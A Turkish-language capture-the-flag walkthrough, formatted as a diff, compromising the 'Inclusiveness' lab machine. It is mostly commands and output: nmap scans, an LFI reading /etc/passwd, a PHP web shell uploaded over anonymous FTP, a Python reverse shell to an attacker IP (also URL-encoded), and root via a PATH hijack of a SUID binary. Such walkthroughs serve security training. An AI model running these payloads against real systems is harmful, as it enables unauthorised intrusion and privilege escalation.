@@ -1,0 +1,183 @@
+      ####Enumeration
+
+Nmap
+Numaralandırmamıza, hedef üzerinde bir port taraması yaparak nmap ile birkaç açık port keşfederek başlıyoruz:
+kali@kali:~$ sudo nmap $targetip
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-16 10:25 EDT
+Nmap scan report for $targetip
+Host is up (0.030s latency).
+Not shown: 65532 closed ports
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+Nmap done: 1 IP address (1 host up) scanned in 126.65 seconds
+Tekrar koşacağız , ancak bu sefer her bir açık portta çalışan servislerle ilgili daha fazla bilgi belirlememize yardımcı olacak bayrağı nmap kullanarak agresif bir tarama yapacağız:-A
+kali@kali:~$ sudo nmap -A -p 21,22,80 $targetip
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-16 10:27 EDT
+Nmap scan report for $targetip
+Host is up (0.030s latency).
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_drwxrwxrwx    2 0        0            4096 Feb 08 21:51 pub [NSE: writeable]
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:$attackerip
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 06:1b:a3:92:83:a5:7a:15:bd:40:6e:0c:8d:98:27:7b (RSA)
+|   256 cb:38:83:26:1a:9f:d3:5d:d3:fe:9b:a1:d3:bc:ab:2c (ECDSA)
+|_  256 65:54:fc:2d:12:ac:e1:84:78:3e:00:23:fb:e4:c9:ee (ED25519)
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Apache2 Debian Default Page: It works
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 4.4 (94%), Linux 2.6.18 - 2.6.22 
+--SNIP--
+kali@kali:~$
+
+Web Numaralandırma
+80 numaralı bağlantı noktasındaki (http://$targetip/) varsayılan sayfaya gitmek, yalnızca varsayılan Apache sayfasını gösterir. Ancak robots.txt dosyasını (http://$targetip/robots.txt) görüntülerken aşağıdakilerle karşılaşıyoruz:
+You are not a search engine! You can't read my robots.txt! 
+Bu kısıtlamayı şu şekilde kolayca atlayabiliriz curl:
+kali@kali:~$ curl -A "GoogleBot" http://$targetip/robots.txt
+User-agent: *
+Disallow: /secret_information/
+kali@kali:~$
+Yeni bir dizin keşfettik: /secret_information/ . Orada gezinirken (http://$targetip/secret_information/), "DNS Bölge Transfer Saldırısı"nı anlatan bir web sayfasıyla karşılaşıyoruz. Web sayfası, İngilizce ve İspanyolca olmak üzere iki köprü içerir :
+DNS Zone Transfer Attack
+
+sömürü
+
+LFI Güvenlik Açığı
+İngilizce köprü tıklandığında , URI olarak değişir http://$targetip/secret_information/?lang=en.php.
+Bu LFI güvenlik açığından şuraya giderek yararlanabiliriz http://$targetip/secret_information/?lang=/etc/passwd:
+$censored
+FTP hizmetinin anonim olarak mevcut olduğunu ve /pub'ın yazılabilir bir dizin olduğunu ilk taramadan gördük . Http://$targetip/secret_information/?lang=/etc/vsftpd.conf aracılığıyla vsftpd.conf
+yapılandırma dosyasındaki bilgileri ifşa etmek için LFI kullanacağız ve dosyanın sonunda aşağıdakileri göreceğiz:
+anon_root=/var/ftp/ write_enable=YES # 
+
+      ####Uzaktan Kod Yürütme
+Uzaktan kod yürütülmesini sağlamak için kötü amaçlı bir PHP dosyası hazırlayacağız ve ardından anonim FTP kullanarak yükleyeceğiz:
+kali@kali:~$ cat backdoor.php 
+<?php system($_GET['cmd']);?>
+kali@kali:~$ ftp $targetip
+Connected to $targetip.
+220 (vsFTPd 3.0.3)
+Name (192.168.120.69:root): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> cd /pub
+250 Directory successfully changed.
+ftp> put backdoor.php
+local: backdoor.php remote: backdoor.php
+200 PORT command successful. Consider using PASV.
+150 Ok to send data.
+226 Transfer complete.
+30 bytes sent in 0.00 secs (1.1444 MB/s)
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-rw-rw-    1 118      125            30 Mar 17 00:45 backdoor.php
+226 Directory send OK.
+ftp> bye
+221 Goodbye.
+http://$targetip/secret_information/?lang=/var/ftp/pub/backdoor.php&cmd=id adresine giderek RCE'yi doğrulayabiliriz. Komut başarıyla yürütüldü:
+uid=33(www-data) gid=33(www-data) groups=33(www-data) 
+Python kullanarak, hedefimize sorunsuz bir geçiş sağlamak için bir ters kabuk oluşturacağız ve ayrıca yükü URL olarak kodlayacağız. Yükünüzdeki IP adresini ve port numarasını gerektiği gibi değiştirdiğinizden emin olun:
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$attackerip",25));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+Aşağıda, URL kodlu yükün nasıl görüneceğine dair bir örnek verilmiştir:
+%70%79%74%68%6f%6e%33%20%2d%63%20%27%69%6d%70%6f%72%74%20%73%6f%63%6b%65%74%2c%73%75%62%70%72%6f%63%65%73%73%2c%6f%73%3b%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%73%6f%63%6b%65%74%2e%41%46%5f%49%4e%45%54%2c%73%6f%63%6b%65%74%2e%53%4f%43%4b%5f%53%54%52%45%41%4d%29%3b%73%2e%63%6f%6e%6e%65%63%74%28%28%22%31%39%32%2e%31%36%38%2e%34%39%2e%32%34%39%22%2c%32%35%29%29%3b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%30%29%3b%20%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%31%29%3b%20%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%32%29%3b%70%3d%73%75%62%70%72%6f%63%65%73%73%2e%63%61%6c%6c%28%5b%22%2f%62%69%6e%2f%73%68%22%2c%22%2d%69%22%5d%29%3b%27
+Nihai yük de dahil olmak üzere tam URL artık hazır; ancak, ters kabuğumuzu yakalamak için önce netcat dinleyicimizi kurmamız gerekiyor. Dinleyicimizi 25 numaralı bağlantı noktasında başlatacağız ve ardından ters kabuğu tetiklemek için aşağıdaki URL'ye gideceğiz:
+http://$targetip/secret_information/?lang=/var/ftp/pub/cmd.php&cmd=%70%79%74%68%6f%6e%33%20%2d%63%20%27%69%6d%70%6f%72%74%20%73%6f%63%6b%65%74%2c%73%75%62%70%72%6f%63%65%73%73%2c%6f%73%3b%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%73%6f%63%6b%65%74%2e%41%46%5f%49%4e%45%54%2c%73%6f%63%6b%65%74%2e%53%4f%43%4b%5f%53%54%52%45%41%4d%29%3b%73%2e%63%6f%6e%6e%65%63%74%28%28%22%31%39%32%2e%31%36%38%2e%34%39%2e%32%34%39%22%2c%32%35%29%29%3b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%30%29%3b%20%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%31%29%3b%20%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%32%29%3b%70%3d%73%75%62%70%72%6f%63%65%73%73%2e%63%61%6c%6c%28%5b%22%2f%62%69%6e%2f%73%68%22%2c%22%2d%69%22%5d%29%3b%27
+Dinleyicimize geri dönersek, kabuğumuzun gelmesi gerekirdi:
+kali@kali:~$ sudo nc -lvp 25
+listening on [any] 25 …
+192.168.249.14: inverse host lookup failed: Unknown host
+connect to [$attackerip] from (UNKNOWN) [$targetip] 52006
+/bin/sh: 0: can’t access tty; job control turned off
+$ python -c 'import pty; pty.spawn("/bin/bash")'
+www-data@inclusiveness:/var/www/html/secret_information$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+      ####SUİD
+İlk adım, SUID bitlerinin etkin olduğu tüm programları veya dosyaları belirlemektir:
+www-data@inclusiveness:/var/www/html/secret_information$ find / -perm -u=s -type f 2>/dev/null
+<_information$ find / -perm -u=s -type f 2>/dev/null     
+...
+/usr/sbin/pppd
+/home/tom/rootshell
+Hemen, /home/tom/rootshell dışarı çıkıyor. /home/tom içinde , rootshell.c'de kaynak koduyla birlikte ilginç bir ikili kök kabuğu buluyoruz :
+www-data@inclusiveness:/var/www/html/secret_information$ cd /home/tom && ls -la
+...
+-rwsr-xr-x  1 root root 16976 Feb  8 13:01 rootshell
+-rw-r--r--  1 tom  tom    448 Feb  8 13:01 rootshell.c
+Kaynak kodunu inceleyelim:
+www-data@inclusiveness:/home/tom$ cat rootshell.c
+cat rootshell.c
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <string.h>
+
+int main() {
+
+    printf("checking if you are tom...\n");
+    FILE* f = popen("whoami", "r");
+
+    char user[80];
+    fgets(user, 80, f);
+
+    printf("you are: %s\n", user);
+    //printf("your euid is: %i\n", geteuid());
+
+    if (strncmp(user, "tom", 3) == 0) {
+        printf("access granted.\n");
+        setuid(geteuid());
+        execlp("sh", "sh", (char *) 0);
+    }
+}
+Kaynak koduna bakıldığında, eğer dosya, doğrulama için whoami tom programı için fonksiyon çağırılarak kullanıcı olarak çalıştırılırsa , ayrıcalıklı bir kabuk elde edeceğiz; 
+Aksi takdirde, o anda oturum açmış olan kullanıcının kullanıcı kimliğini yazdıracaktır. Diğer bir deyişle, rootshell programı, whoami programının çıktısı ise yüksek ayrıcalıklı bir kabuk verir .tom
+PATH değişkenini kötüye kullanarak bu yanlış yapılandırmadan kolayca yararlanabiliriz. Burada /tmp dizininde whoami isimli bir dosya oluşturuyoruz ve print etmek için aşağıdaki bash kodunu yazıyoruz :tom
+www-data@inclusiveness:/home/tom$ cd /tmp
+cd /tmp
+www-data@inclusiveness:/tmp$ echo "printf "tom"" > whoami
+echo "printf "tom"" > whoami
+www-data@inclusiveness:/tmp$ chmod 777 whoami
+chmod 777 whoami
+www-data@inclusiveness:/tmp$
+Ardından, aşağıdaki komut yardımıyla geçici bir PATH değişkeni ekliyoruz:
+www-data@inclusiveness:/tmp$ export PATH=/tmp:$PATH
+export PATH=/tmp:$PATH
+www-data@inclusiveness:/tmp$ echo $PATH
+echo $PATH
+/tmp:/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/bin
+www-data@inclusiveness:/tmp$ 
+Her şey bittiğinde, kök kabuğunu almak için kök kabuk programını çalıştırabiliriz :
+www-data@inclusiveness:/tmp$ cd /home/tom
+cd /home/tom
+www-data@inclusiveness:/home/tom$ ./rootshell
+./rootshell
+checking if you are tom...
+you are: tom
+access granted.
+# id
+id
+uid=0(root) gid=33(www-data) groups=33(www-data)
